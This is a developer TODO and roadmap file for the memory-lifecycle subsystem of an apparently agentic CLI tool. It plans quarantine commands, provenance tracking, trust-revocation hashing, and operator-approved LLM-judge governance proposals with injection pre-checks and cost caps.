# TODO — deferred work

Items intentionally left for later milestones, with the deferral
rationale and a "pull-in" signal so we know when to revisit.

The first section ("ACTIVE") is different — it tracks work in flight
on a named branch with slices and tasks. When a slice closes, its
artifacts move to `docs/BACKLOG.md` and the entry here is trimmed.

---

# ACTIVE — `feat/memory-lifecycle-detectors`

**Branch off `feat/retrieval`.** Goal: close the four automatic detectors spec'd in `docs/spec/MEMORY.md §6.5.2` and `docs/spec/EVICTION.md §5.1` — `verify_failed`, `user_override_repeated`, `conflict_detected`, `trust_revoked` — plus the upstream infrastructure they depend on. Production-ready: substrate + detectors + operator surfaces + audit + tests + docs.

Order matters: Slice 1 (provenance) is foundational for Slices 2 and 3. Slice 6 (penalty + visual flag) is independent.

## Slice 0 — Operator escape hatch + audit baselines

Land the manual paths before the auto-detectors so the pipeline is end-to-end testable and operators have a way to drive transitions explicitly.

| Task | Status | Description |
|---|---|---|
| **T0.1** | ✅ done | `/memory quarantine <name> --motivo <kind> --evidence "…"` slash command — invokes `transitionMemoryState` with the operator's motivo. Accepts every spec motivo (`conflict`, `shift`, `security`, `low_roi`, `irrelevant`). |
| **T0.2** | ✅ done | `/memory list` rendering — `[QUARANTINED] / [INVALIDATED] / [PROPOSED] / [EXPIRED <date>]` prefix flags, `(expires <date>)` suffix for future-expiring active entries, `[ORPHAN] / [MALFORMED]` markers for unreadable rows. Spec §6.5.2 motivo+date format deferred (JOIN with eviction_events). |
| **T0.3** | ✅ done | `/memory audit --trigger <source>` filter — literal match on `details.trigger`, plus semantic shortcuts `operator` (matches `operator_driven`) and `detector` (matches the 4 spec detectors: `verify_failed`, `user_override_repeated`, `conflict_detected`, `trust_revoked`). Lays the forensic path for Slices 2-5. |
| **T0.4** | ✅ done | Tests landed inline per task (T0.1: 9, T0.2: 7, T0.3: 5 = 21 new tests). `docs/MEMORY.md` §6 table updated with the 3 new surfaces (quarantine verb, list rendering, audit --trigger); §14.5 entry added under "What IS shipped" pointing to the Slice 0 closure. |

**Acceptance:** operator runs `/memory quarantine foo --motivo conflict --evidence "duplicates bar"`, sees foo in `/memory list` with quarantine flag, inspects the row in `/memory audit`. Pipeline tested end-to-end.

## Slice 1 — Memory **exposure** infrastructure · ✅ DONE

Tracks which memory(s) **were visible to the model** at the moment of each tool call. **Not causation** — the model may ignore an exposed memory entirely. Exposure trace is foundational for the failure-correlation surfaces in Slices 2 (`verify_failed` runs against exposed memories) and 3 (`user_override_repeated` counts overrides per exposed memory).

Closed in 9 commits (`719ff0a..dab5d73` on `feat/memory-lifecycle-detectors`). Three emitters (memory_read/eager/retrieve_context), one operator surface (`/memory provenance`), 90d retention sweep, full §11.2 docs. Post-review hardening pass landed bugs/guards/idempotency. See `docs/BACKLOG.md` for the slice closure summary.

## Slice 2 — `verify_failed` detector · 🔁 ROLLED BACK (heuristic removed; substrate only)

Initial S2 shipped a regex-based path-extraction heuristic + `existsSync` verification. Rolled back per policy decision: **"todo o lifecycle de memória um llm-judge decide; sem heurísticas locais sobre texto"**. Regex over prose can't distinguish factual assertion from historical mention ("we moved away from src/old-auth.ts" → heuristic quarantines, but memory was describing history). Same fundamental class of false-positive as S4's textual conflict heuristic.

What survives in V1:
- The generic `/memory audit --trigger verify_failed` filter (from S0/T0.3) — operator-facing audit surface ready to render `verify_failed` rows when an LLM-judge emits them.
- The spec-defined trigger NAME `verify_failed` — preserved as the canonical identifier; future LLM-judge emits the same trigger.

What was deleted from the initial S2 attempt:
- `src/memory/verify/` entire directory (factuality classifier + project verifier + scheduler + types).
- `tests/memory/verify/` entire directory.
- Wire-up in `src/harness/loop.ts` (scheduler creation + poll + drain).

T2.1-T2.6 move to Phase 2 / S11 (semantic verify via LLM-judge). S11 framing updates: no longer "fallback over heuristic unknown" — LLM-judge becomes the PRIMARY path for factual contradiction detection. The hierarchy-of-mechanisms argument from spec §1.1.1 still holds in principle, but in this codebase's memory subsystem **the heuristic tier is intentionally empty** because: (a) regex over prose can't reliably distinguish assertion from mention, and (b) the deterministic part (path-existence) only matters AFTER a fragile extraction step that the heuristic gets wrong.

**Acceptance (revised):** zero text-heuristic in memory lifecycle decisions; `verify_failed` trigger name + audit filter preserved as substrate for S11 to populate via LLM-judge proposals.

## Slice 3 — `user_override_repeated` detector

**Boundary:** counter + threshold are DETERMINISTIC (event counts, sliding window math — not text judgment). When the threshold trips, fire an LLM-judge proposal via S8 (NOT auto-quarantine). Operator approves to apply. Aligns with §1.1.4 (confidence ≠ authority) and the "propose-not-mutate" policy.

| Task | Description |
|---|---|
| **T3.1** | Override signal detection — three concrete signals: (a) modal `MemoryWrite` rejected on a memory; (b) `permission ask` denied for a tool whose provenance points to this memory; (c) `edit_file` reverted within N turns of write. Each emits a `memory_override_events` row. |
| **T3.2** | Migration `055-memory-override-events.sql` — `(id, session_id FK, memory_scope, memory_name, signal ENUM, tool_call_id FK NULL, created_at)`. |
| **T3.3** | Sliding window counter — `countOverridesInWindow(scope, name, windowMs)`. Spec threshold: 3 in 24h. Deterministic counter; no text judgment. |
| **T3.4** | Threshold-triggered proposal — runs on each new override event; when threshold crosses, dispatch LLM-judge subagent with the override history + the exposed memory body. Subagent returns `{ conflicting: bool, confidence: 0.0-1.0, reasoning, suggested_motivo }`. Emit `memory_governance_proposals` (S8) with the verdict. Operator approves → state-machine transitions to quarantined with `trigger=user_override_repeated, motivo=conflict`. Below confidence threshold → proposal auto-archived. |
| **T3.5** | Tests covering each signal kind + threshold boundary (3 vs 2 hits) + proposal landing in pending state + operator approval flow. |

**Acceptance:** user rejects 3 tool-call modals in 24h whose provenance traces to memory X → governance proposal lands in pending state for operator review. Operator approves → X transitions to quarantined with full audit trail. Sub-3 hits: no proposal, no signal. The threshold (3 in 24h) is the deterministic gate that COSTS A LLM CALL; below threshold there's zero LLM cost.

## Slice 4 — `conflict_detected` audit substrate · ✅ DONE (substrate only)

Ships **only** the audit substrate. Detector deferred to Phase 2 (LLM-judge — see new Slice S13 below). Initial S4 implementation built a textual heuristic that was rolled back: <5% real-world coverage, false-positive paths on common English words, fundamentally incapable of paraphrase / semantic equivalence detection. The substrate (audit query helper + `/memory conflicts` slash) is forward-compatible with the LLM-judge path and ships now so the operator surface exists when Phase 2 lands.

What landed:

| Task | State | Description |
|---|---|---|
| **T4.4** | ✅ done | `/memory conflicts` slash command — lists eviction_events filtered by `trigger='conflict_detected'`, cross-session forensic surface. Renders `<ts> · <kind> · winner=<scope/name> loser=<scope/name> token="<shared>"`. `--limit N` default 50. |
| Helper | ✅ done | `listEvictionEventsByTrigger(db, trigger, limit)` in `eviction-events.ts` — generic. Backs `/memory conflicts` and any future trigger-filtered slash. |
| Tests | ✅ done | 4 slash tests pin empty-state hint, row rendering, `--limit` cap, unknown-flag rejection. |

What does NOT ship in S4 V1 (moved to Phase 2 / S13):

- T4.1 (pairwise comparator) — heuristic-coupled; replaced by LLM dispatcher in S13.
- T4.2 (textual contradiction heuristic) — removed entirely per "no local heuristics over text" decision.
- T4.3 (resolver) — semantics documented for S13 to implement (provenance tier > recency > scope specificity > body length → deterministic tiebreak).
- T4.5 (emit `conflict_detected`) — will land in S13 via S8 governance proposal path (propose-not-mutate; operator approves → state machine transitions).
- T4.6 (heuristic tests) — N/A; S13 will pin LLM-judge behavior with structured-output fixtures.

**Acceptance (revised):** `/memory conflicts` slash shows zero rows pre-S13 (heuristic-free), but the audit surface is ready to render LLM-judge verdicts once S13 lands.

## Slice 5 — `trust_revoked` detector

Mass-quarantines `shared/` memories when operator revokes trust after a hash change.

**Architectural rationale (boundary check against zero-heuristic commitment):** S5 fits within the architectural commitment because:
- **Detection is deterministic** — SHA-256 hash diff over canonical concat of shared/MEMORY.md + bodies. No prose judgment; the hash either matches or doesn't.
- **Judgment is operator authority** — the boot modal IS the explicit consent moment (§1.1.4: authorization vem de "operator explicit approval"). System surfaces the change; operator decides.
- **Bulk transition is justified by the modal's consent** — modal shows the diff preview; operator's revoke choice IS consent for the bulk effect across all shared memories. Per-memory governance proposals would be UX-wrong here: the operator already reviewed and decided in one place. Splitting into N proposals to approve individually would force the same decision N times.
- **Diff preview shows raw changes** — no summarization, no "looks malicious" classification. Operator reads the diff and forms their own judgment.

| Task | Description |
|---|---|
| **T5.1 ✅** | `shared/` content fingerprint — hash over canonical concat of `.agent/memory/shared/MEMORY.md` + every body file (sorted by name). Persisted in `shared_corpus_trust` (migration 055), keyed by absolute scope-root path. SHA-256 with `forja:shared-corpus:v1\n` domain separator and `filename\n<bytes-len>\n<bytes>\n` framing per file. `src/memory/trust-corpus.ts` exports `computeSharedFingerprint`, `getSharedTrust`, `setSharedTrust`, `clearSharedTrust`. 19 substrate tests. |
| **T5.2 ✅** | Boot-time re-prompt — `src/memory/trust-corpus-probe.ts` orchestrator runs the probe state machine (seeded / unchanged / reconfirmed / revoked / verify_failed). TUI flavor `shared-trust:ask` (`src/tui/events.ts`, `modal-manager.ts`, `state.ts`) renders a corpus inventory preview (file names + byte sizes, capped at 8 visible). Wired into `bootstrap.ts` BETWEEN GC sweeps AND `assembleMemorySection` so the bulk-invalidate landing on disk takes effect in this very boot's system prompt. REPL boot (`src/cli/repl.ts`) passes the modal callback + pre-subscribes stdin so the modal can receive input during bootstrap. 8 probe tests + 5 bootstrap integration tests. |
| **T5.3 ✅** | On operator revoke → emit `trust_revoked` for every `state=active` shared memory; transition all to `invalidated` with `motivo=security` (NOT `quarantined` — per EVICTION.md §4.1, `active → quarantined` admits only `conflict`/`low_roi`; `active → invalidated` is the canonical target for security events). Already-quarantined shared memories are left alone (`quarantined → invalidated` admits only `shift`). The modal interaction IS the authorization — no governance proposal layer for the bulk transition. Also added: `src/cli/memory-prompt.ts` filters `state === 'invalidated'` from the eager-load section so the revocation removes invalidated memories from THIS session's system prompt (rather than requiring restart). |
| **T5.4 ✅** | `/memory trust status` shows trust state + last hash + last re-confirm timestamp. Read-only inspector in `src/cli/slash/commands/memory.ts:handleTrust`. Renders four states: `never confirmed`, `in sync`, `DIVERGED` (upper-cased for visual weight), `VERIFY FAILED`. Hashes truncated to first 12 hex chars + ellipsis; inventory line reports file count + total bytes (counts MEMORY.md alongside body files since the fingerprint hashes both). Strict args validation refuses unknown subcommands AND extra args after `status`. 6 slash tests. |
| **T5.5 ✅** | Coverage strengthening: (a) reconfirmed path asserts ZERO eviction events emitted + memory stays active (regression guard against the bulk path accidentally running on the 'yes' branch); (b) `verify_failed` path covered via `chmod 000` on the shared root (skipped under root since unix perms are bypassed); (c) bootstrap-layer `unchanged` integration test verifies no modal fires and the trust row's timestamp is not bumped. |

**Acceptance:** operator `git pull`s a commit that adds 2 new shared memories; next session boot re-prompts; if declined, the new + existing shared memories enter `quarantined`.

## Slice 6 — Quarantine penalty ranking + visual flag (EVICTION §9.7)

Walk back the H1+H6 hard-filter (commit `949fadf`) to spec'd behavior: quarantined memories stay visible, with penalty + visual flag.

| Task | Description |
|---|---|
| **T6.1** | Retrieval memory view — include `quarantined` in candidate pool with ranking penalty (multiply final score by 0.3). Update view's `registry.list({ states: ['active', 'quarantined'] })`. |
| **T6.2** | Visual flag in eager-load — `cli/memory-prompt.ts` renders quarantined entries with `[memory: quarantined — <reason> <date>]` per spec §6.5.2. |
| **T6.3** | `/memory list` shows the same flag (already partial in T0.2; verify integration). |
| **T6.4** | Tests: quarantined memory appears in retrieval candidates but ranks below active sibling; visual flag renders in eager-load. |

**Acceptance:** quarantined memories visible to operator and model with penalty + tag. Operator decides whether to restore or delete.

## Slice 7 — Docs + E2E smoke

| Task | Description |
|---|---|
| **T7.1** | `docs/MEMORY.md §14` update — remove shipped items. |
| **T7.2** | `docs/spec/MEMORY.md` annotations if implementation revealed ambiguity (ask before editing per CLAUDE.md). |
| **T7.3** | E2E smoke — single test: write 2 contradicting memories → second triggers `conflict_detected` → loser quarantined → operator `/memory restore` → memory back to active. |
| **T7.4** | `docs/BACKLOG.md` comprehensive entry summarizing slice closure. |

---

# Phase 2 — LLM-judge governance (proposed branch: `feat/memory-governance-llm`)

Heuristic family (Slices 0-7) covers the operations where ground truth is unambiguous (path-existence, override-counts, hash divergence). Phase 2 adds the LLM-judge layer for operations where heuristics can't reach: **semantic drift, paraphrase contradiction, consolidation candidate detection**.

Design constraints carried forward from the heuristic-vs-LLM analysis:

- **Propose-not-mutate.** LLM subagent NEVER writes/mutates memory directly. It emits structured proposals; a deterministic validator + operator approval flow drives the actual state transition.
- **Heuristic-first, LLM-fallback.** Slice 2 heuristic stays as-is; LLM only runs over the `unknown` subset where the heuristic couldn't conclude. ~30% of memories produce heuristic verdicts; the remaining ~70% are LLM's domain.
- **Injection-aware by construction.** Memory bodies are operator-edited and some are marked `trust: untrusted`. Every body that enters the subagent's window passes through `scanForInjection` first; system prompt explicitly frames input as adversarial; output is JSON-schema-validated (not free text) so prose injections can't shape the response.
- **Confidence decay.** Pending proposals expire after 30 days. A stale proposal that didn't get reviewed loses authority — automation that auto-applied based on month-old confidence would be drift, not governance.
- **Multi-source evidence.** Proposals carry not just LLM verdict but: provenance lineage, retrieval stats, outcome correlation. Never trust embedding/body content as sole evidence.

## Slice 8 — Memory governance proposal substrate

Foundational table + repo + approval flow. No LLM yet — this is the deterministic spine the subagent (Slice 11) lands its findings on.

| Task | Description |
|---|---|
| **T8.1** | Migration `055-memory-governance-proposals.sql` — `memory_governance_proposals(id PK, session_id FK NULLABLE, kind ENUM('quarantine','restore','demote','merge','consolidate','expire'), source_memory_keys JSON, target_payload JSON NULLABLE, confidence NUMERIC, evidence JSON, status ENUM('pending','applied','rejected','expired'), proposed_by TEXT, created_at INTEGER, decided_at INTEGER NULLABLE, decided_by TEXT NULLABLE)`. `proposed_by` field carries `subagent:<name>` or `operator:<id>` so audit distinguishes auto vs manual proposals. `source_memory_keys` is an array of `{scope, name}` so multi-memory operations (merge, consolidate) carry their inputs. |
| **T8.2** | Repo `src/storage/repos/memory-governance.ts` — `recordProposal(input)`, `listPendingProposals(db, limit?)`, `listProposalsForMemory(db, scope, name)`, `decideProposal(db, id, decision, decidedBy)`, `expirePendingProposals(db, olderThanMs)`. Session-scoped where applicable (mirroring Slice 1 privacy default); cross-session aggregate via explicitly-named `listGlobalProposals*`. **Proposal fingerprint:** column `proposal_fingerprint TEXT NOT NULL` = SHA-256 of `JSON.stringify({kind, sorted(source_memory_keys), evidence_essence_hash})`. UNIQUE partial index `WHERE status = 'pending'` so two subagent runs can't enqueue the same proposal twice. Collision on INSERT → no-op silent (does NOT bump `created_at`; the existing pending row keeps its identity). Applied/rejected/expired keep multiple historical rows — useful for detector quality measurement. **Source-memory snapshots (staleness guard):** column `source_memory_snapshots JSON NOT NULL` records `{ scope, name, content_hash }[]` for every memory referenced in `source_memory_keys`, captured at proposal creation time. The apply path (T8.3) verifies each entry against the memory's CURRENT `hashMemoryContent(serializeMemoryFile(...))` before transitioning; any mismatch → proposal status='rejected', `decided_by='system:stale_evidence'`, `decided_reason` includes which memories drifted (scope/name + old hash prefix + new hash prefix). Closes the propose-not-mutate gap where a proposal landed against body X but the operator approves days later against body Y. |
| **T8.3** | Apply path — `applyProposal(db, registry, id, decidedBy)` validates schema → loads memory → **verifies source_memory_snapshots match current content_hash for every entry** (staleness gate per T8.2) → delegates to existing `transitionMemoryState`. Pre-flight refuses if: memory has changed state since proposal, evidence schema invalid, confidence below configured threshold, OR any snapshot drifted (drift wins over state-change in the rejection reason — operator sees "memory edited since proposal" not "memory state already not active"). Failures emit `decision: 'rejected'` with reason instead of attempting the transition. |
| **T8.4** | TTL sweep — `pendingExpiredCutoffMs = 30d` default. Boot-time prune wraps `expirePendingProposals(db, now - 30d)`. Same posture as `pruneMemoryProvenance` (best-effort, AUDIT DRIFT on failure). Constant exported as `GOVERNANCE_PROPOSAL_TTL_MS`. |
| **T8.5** | Slash `/memory governance list [--status pending\|applied\|rejected\|expired]`, `/memory governance show <id>`, `/memory governance approve <id>`, `/memory governance reject <id> [--reason "..."]`. Approval triggers T8.3 apply path. Confirmation modal for `approve` when kind affects ≥3 memories. |
| **T8.5b** | Slash `/memory governance audit <id>` — lineage view: proposal → approval decision → resulting `eviction_events` row(s) → subsequent exposure history of the affected memories. Reads on-demand from existing tables (`memory_governance_proposals` + `memory_events` + `eviction_events` + `memory_provenance`) — no materialized lineage table. JOIN-style query in the slash handler. Enables operator-level detector-quality forensics ("of last 10 verify_failed proposals, how many got reversed?"). Materialized lineage table is deferred until query latency proves it necessary. |
| **T8.6** | Tests covering each `kind` x each `status` transition, TTL boundary (29d kept / 30d swept), confidence threshold gate, schema validation refusal, cross-session aggregate vs session-scoped privacy. |
| **T8.7** | `docs/MEMORY.md §11.3` — governance proposals doc. Schema, lifecycle, slash surfaces, what proposals do NOT do (mutate state without approval). |

**Acceptance:** operator runs `/memory governance list` and sees pending proposals. `approve <id>` applies via `transitionMemoryState`; row status flips to `applied`, decided_at + decided_by set. Pending proposals expire silently after 30d. No memory state mutates without explicit approval.

## Slice 11 — Semantic verify_failed (LLM-judge primary path)

THE detector for factual contradiction in memory subsystem. S2's heuristic was rolled back; LLM-judge is the only path. Routes factual memories (`type: project` or `reference`) through a sandboxed subagent that does semantic verification with FS tools (read_file, grep, memory_read).

**Cost-bounded:** opt-in flag (`--memory-verify-llm` or policy), per-session dispatch cap + cost cap, content-hash + recency dedup so unchanged memories don't re-trigger. The cost discipline that S2's heuristic-first layering provided is now provided by these guardrails instead.

| Task | Description |
|---|---|
| **T11.1** | Subagent definition `src/subagents/builtin/verify-semantic.md` (or `.agent/subagents/`, TBD per project convention) — system prompt frames input as adversarial, requires JSON output, enumerates allowed tools (read_file, grep, memory_read — read-only set). Output schema: `{verdict: "passed"|"contradicted"|"inconclusive", confidence: 0.0-1.0, claim_extracted: string, ground_truth_observed: string, evidence_paths: string[]}`. |
| **T11.2** | Injection pre-check — `scanForInjection(memory.body)` runs BEFORE the body enters the subagent's input. Flagged bodies skip semantic verification entirely; emit `verify_skipped` stderr line. The trust filter's intent (untrusted bodies out of model windows) extends to governance subagent windows. |
| **T11.3** | Scheduler dispatch — extend `createVerifyScheduler` so when the project heuristic returns `unknown`, the scheduler enqueues a SECONDARY task that dispatches the semantic subagent. Gated on `config.memorySemanticVerify === true` (opt-in flag in `HarnessConfig`, default false) so operators consciously enable LLM cost. **Pre-dispatch dedup guard:** before enqueueing, check `listProposalsForMemory(scope, name)` with `status='pending'` AND `kind='quarantine'`. If a pending proposal already exists for this memory, skip dispatch — avoids paying LLM cost to generate a proposal that would collide with the existing pending row anyway (T8.2's fingerprint UNIQUE index would refuse the INSERT). |
| **T11.4** | Subagent runner integration — uses existing `task_async` infrastructure: subagent spawn carries its own sandbox profile (no fs.write, no bash, no network beyond tool whitelist), depth gate, cost budget. Reuses `subagent_runs` audit table for prompt_hash + model_id + structured_output capture. |
| **T11.5** | Structured output validator — JSON schema on the subagent's return. Malformed output → discard, log `verify_semantic_malformed` stderr. The validator is the same shape as the runtime's existing `outputSchema` enforcement for `task` results. |
| **T11.6** | Emit as `memory_governance_proposals` (S8) — kind=quarantine, source_memory_keys=[{scope, name}], confidence=`output.confidence`, evidence=`{verdict, claim_extracted, ground_truth_observed, evidence_paths, subagent_run_id, prompt_hash}`. proposed_by=`subagent:verify-semantic`. |
| **T11.7** | Confidence threshold gate — proposals with `confidence < 0.7` auto-archived (status=rejected, decided_by=`system:low_confidence`). Above threshold lands as pending for operator review. Constant `SEMANTIC_VERIFY_MIN_CONFIDENCE` exported and tunable. |
| **T11.8** | Operator opt-in surface — bootstrap CLI flag `--memory-verify-llm` OR policy `[memory.verify].llm = true`. Default off. Surfaced in `/memory governance status` (new subcommand) showing whether LLM-judge is active for this session. |
| **T11.9** | Per-session cost + dispatch caps — `MEMORY_VERIFY_SEMANTIC_MAX_DISPATCHES_PER_SESSION` (default 10) + `MEMORY_VERIFY_SEMANTIC_MAX_COST_USD` (default 0.50). Scheduler refuses dispatch beyond cap; logs `memory: verify_semantic_budget_exhausted` stderr line so operator sees the throttle. Constants exported and tunable via policy. Without caps, opt-in operator can see surprise bills when memory corpus grows. |
| **T11.10** | `last_semantic_verify_at` dedup — `memory_verify_attempts(id, scope, name, content_hash, verdict, confidence, model_id, prompt_hash, attempted_at)` table. Scheduler skips re-dispatch when `(content_hash unchanged AND attempted_at > now - 7d AND verdict ∈ {passed, inconclusive})`. Cross-session memo so an opt-in operator doesn't pay LLM cost every boot for memories the subagent just judged unchanged. Contradicted verdicts always re-dispatch (high-stakes; want re-confirmation). |
| **T11.11** | Tests + acceptance — fixture: project memory `"we use JWT for auth"` in tmpdir whose code shows OAuth-only patterns. Heuristic returns `unknown` (no path claim) → semantic dispatched → subagent reads files → returns `contradicted` with `confidence: 0.85` → proposal lands in `pending` → operator approves → memory quarantined with paired `memory_events` + `eviction_events` rows. Additional pin: cost cap fires when synthetic budget of $0.01 is set + 11 dispatches attempted (11th refused). Additional pin: dedup table skips re-dispatch when content_hash unchanged + same-day attempt exists. |

**Acceptance:** with opt-in enabled, a semantic-only contradicted memory generates a pending proposal within one turn of being exposed. Operator approves via slash; memory transitions to `quarantined` with full audit trail (eviction_events + governance_proposal + subagent_runs all cross-linkable by ids). With opt-in disabled, no LLM call fires and no proposal lands (default-zero-cost preserved).

**What S11 does NOT do (deferred):**
- Consolidation (N similar memories → 1) — that's Slice 10 (not in scope here; subagent infrastructure of S11 is the building block but the consolidation prompt + flow is its own slice).
- Conflict detection between memories (pairwise) — Slice 13 below (V1 of S4 shipped audit substrate only; the LLM-judge conflict detector lands here).
- Drift detection across time (memory written 90 days ago, codebase migrated) — would need cross-session subagent that doesn't exist today. Future infrastructure.

## Slice 13 — LLM-judge `conflict_detected` detector

Replaces the heuristic textual matcher that S4 attempted and rolled back. The audit substrate (`/memory conflicts` slash + `listEvictionEventsByTrigger` repo helper) shipped in S4 V1; S13 wires the actual detection pipeline through S8's governance proposal substrate + S11's subagent infrastructure.

Why deferred to Phase 2 alongside S11:

- Heuristic textual conflict detection has unacceptable coverage on real-world prose (operator-authored memories rarely contain literal antonym + token-identical assertions). Empirical analysis during S4 V1 attempt showed <5% real-conflict coverage with non-zero false-positive surface on common English words.
- LLM-judge is the only path with realistic recall on paraphrase, semantic equivalence, and cross-clause contradictions.
- Direct auto-quarantine from a non-deterministic LLM verdict violates §1.1.4 (confidence ≠ authority). The propose-not-mutate path via S8 is the architecturally correct integration.

| Task | Description |
|---|---|
| **T13.1** | Subagent definition `verify-conflict.md` — analogous to S11's `verify-semantic.md`. System prompt frames input as adversarial pair (two operator-edited memory bodies); requires structured JSON output `{ conflicting: bool, conflict_kind: string, confidence: 0.0-1.0, evidence: { shared_concept: string, polarity_a: string, polarity_b: string } }`. Tool whitelist: `memory_read` only (the subagent already has both bodies in input). |
| **T13.2** | Pair-selection scheduler — at step boundary, polls `memory_events` for `action='created' | 'updated'` rows. For each unique (session, scope, name), pairs the written memory against active/quarantined siblings in the same scope (intra-scope only; T4.6 carries forward). **BM25 prefilter (avoid O(N²) explosion):** before dispatching pairwise LLM calls, run the just-written memory's body as a BM25 query against the same-scope sibling corpus (reuse `src/retrieval/views/memory.ts:createMemoryView` with `loadBodies: true`). Take top-K siblings (K=5 default, exported constant `CONFLICT_PREFILTER_K`). LLM-judge fires ONLY on those K pairs. For N=200 siblings, this caps LLM dispatch at 5 instead of 199 (40× cost reduction in worst case). Rationale: BM25 surface-token overlap is necessary-but-not-sufficient for semantic conflict — if zero token overlap, semantic conflict is implausibly rare; if some overlap, LLM-judge is worth the call. K=5 is the cheap-confident bound; tunable via policy. |
| **T13.3** | Injection pre-check + scanForInjection on BOTH bodies before invocation. Pair-level invocation means TWO potentially adversarial bodies enter the judge's window simultaneously; the system prompt must explicitly frame BOTH as adversarial input. |
| **T13.4** | Per-pair cost cap + dedupe. Reuse S11's `MAX_DISPATCHES_PER_SESSION = 10` + `MAX_COST_USD = 0.50` budgeting. Dedupe via `memory_verify_attempts` extension OR new `memory_conflict_attempts` keyed by `(session, scope-a/name-a, scope-b/name-b, content_hash_a, content_hash_b)`. |
| **T13.5** | Resolver implementation (carrying forward from S4 V1 design): provenance tier (`user_explicit > inferred > imported`) → recency → scope specificity → body length tiebreak → deterministic tiebreak (a wins). Pure function, LLM-agnostic. |
| **T13.6** | Emit governance proposal via S8 — kind=quarantine, source_memory_keys=[winner, loser], evidence=`{ winner_id, loser_id, conflict_kind, confidence, shared_concept, polarity_a, polarity_b, subagent_run_id, prompt_hash }`. Confidence below threshold (`SEMANTIC_CONFLICT_MIN_CONFIDENCE = 0.7`) auto-archives as rejected. Above threshold lands pending for operator review. |
| **T13.7** | Operator opt-in surface — `--memory-conflict-llm` flag OR policy `[memory.conflict].llm = true`. Default off. Surfaced via `/memory governance status`. |
| **T13.8** | Tests — fixture: pair of memories with semantic-only contradiction (e.g., `"use JWT for auth"` + `"the auth flow uses OAuth"`). Subagent verdict `conflicting: true, confidence: 0.85` → proposal lands pending → operator approves → loser quarantines with paired audit. False-positive avoidance pin: pair without semantic conflict → `conflicting: false` → no proposal. |

**Acceptance:** with opt-in enabled, writing a memory that semantically contradicts an existing same-scope sibling generates a pending governance proposal within one turn. Operator approves → loser transitions to `quarantined` with full audit (eviction_events + governance_proposal + subagent_runs cross-linkable). With opt-in disabled, no LLM call fires.

---

## Out of scope (deliberate)

- **`distribution_shift` / `source_removed` detectors** — listed in EVICTION §5.1 but tied to startup probes for external sources. Tracked separately as "reference dereference probe".
- **Compaction × quarantine cross-lifecycle** (EVICTION §9.7) — context-tuning subsystem's responsibility, not memory's.
- **`roi_below_threshold` detector** — depends on loop frio aggregation (FEEDBACK_ADAPTATION §3.2); listed in `docs/MEMORY.md §14.4`.

## Dependency graph

```
Phase 1 — substrate + audit family (NO text heuristics — policy decision)
  S0 (escape hatch)              →  ✅ done
  S1 (provenance)                →  ✅ done, blocks S3/S11/S13
  S2 (verify_failed substrate)   →  🔁 rolled back; audit-only via /memory audit --trigger
  S6 (penalty)                   →  ✅ done
  S4 (conflict audit substrate)  →  ✅ done (substrate only)
  S5 (trust_revoked)             →  hash check + operator modal (no heuristic — deterministic)
  S3 (override counter)          →  threshold counter + LLM-judge proposal (deterministic gate, LLM verdict)
  S7 (docs+smoke)                →  last (after S0..S6)

Phase 2 — LLM-judge governance (new branch)
  S8  (proposal substrate)        →  foundational, blocks S10/S11/S13
  S11 (LLM-judge verify_failed)   →  PRIMARY detector for factual drift; depends on S8
  S13 (LLM-judge conflict)        →  depends on S8 + S4 audit substrate
  S10 (consolidation subagent)    →  depends on S8, deferred
  S12 (confidence separation)     →  independent, deferred
```

Recommended order: **S0 ✅ → S1 ✅ → S2 🔁 → S6 ✅ → S4 ✅ → S5 → S3 → S7 → S8 → S11 → S13**.

Architectural commitment: zero text-heuristic for memory lifecycle decisions in this codebase. All prose judgment defers to LLM-judge via S8 governance proposals (propose-not-mutate; operator approves). Deterministic substrate (state machine, audit, frontmatter, hashing, expiry, scope precedence) stays.

Phase 2 ideally lands on a separate branch (`feat/memory-governance-llm`) since the LLM-judge family introduces a different risk surface (injection, cost, non-determinism) and merging Phase 1 first keeps the heuristic baseline shippable independently.

## Tracking

Each task lands as one or more commits on the active branch. Each slice closes with a `feat(memory): slice N done` entry in `docs/BACKLOG.md` summarizing the slice's commits. Phase 1 final consolidation at S7; Phase 2 begins on a new branch after that lands.

---

# DEFERRED — items intentionally left for later

## Memory quarantine flag enrichment: motivo + date (MEMORY.md §6.5.2)

**Status:** noted during Slice 0 (T0.2) and Slice 6 (T6.2) implementation. Same deferral shape on two surfaces.

**What it is:** spec §6.5.2 formats the quarantine flag as `[memory: quarantined — <motivo> <YYYY-MM-DD>]` — e.g., `[memory: quarantined — conflict 2026-04-15]`. Both the `/memory list` slash command (T0.2) and the eager-load section in `cli/memory-prompt.ts` (T6.2) ship the minimal `[memory: quarantined]` flag today without the motivo + date enrichment.

**Why deferred:** motivo + date live in `eviction_events`, NOT in the memory frontmatter. Enriching the flag requires a JOIN against `eviction_events` (specifically the latest applied `quarantined` event for that `(scope, name)` pair via `getLastQuarantineEvent`). Two call sites means two JOIN points; both should land together when the enrichment is wired so the format stays consistent across surfaces.

**Where it would land:**

- `src/cli/slash/commands/memory.ts` — `handleList` already peeks per-listing for state rendering (T0.2). Extend to call `getLastQuarantineEvent(db, 'memory', name, scope)` for each quarantined entry; format `[QUARANTINED motivo YYYY-MM-DD]`.
- `src/cli/memory-prompt.ts` — `assembleMemorySection` already peeks for trust filter; extend to lookup the same quarantine event; format `[memory: quarantined — motivo YYYY-MM-DD]` per spec.

**Pull-in signal:** operator request OR detector volume crosses threshold where "which memory is quarantined for which reason" becomes opaque from the bare flag. Estimate: ~10 quarantined memories per install. Below that, the bare flag + `/memory audit` lookup is enough.

**Cost when pulled:** ~1 disk-cached SQL query per quarantined entry per render. For a session with N quarantined (likely < 5), negligible.

## Memory trust filter on `retrieve_context` slot (MEMORY.md §14.3, AGENTIC_CLI §1.1.5)

**Status:** acknowledged gap pre-S6; widened by S6 (quarantined memories now reach the slot, but no trust filter).

**What it is:** the retrieval memory view (`src/retrieval/views/memory.ts`) filters by `states: ['active', 'quarantined']` + `includeExpired: false` but does NOT filter by `trust`. An operator-marked `trust: untrusted` memory reaches the retrieve_context slot unimpeded — eager-load filters it out (§7.2.2), but retrieval doesn't.

**Why deferred:** the gap predates S6 (active untrusted memories already reached retrieval); S6 expanded it to include quarantined untrusted memories. Fixing it requires deciding the contract: hard-filter (mirror eager-load), include with marker, or operator-policy opt-in. Decision is design work, not just code work.

**Where it would land:**

- `src/retrieval/views/memory.ts:114-118` — add `trustFilter` option to the `registry.list()` call, OR a post-list filter on `listing.peek.frontmatter.trust`.
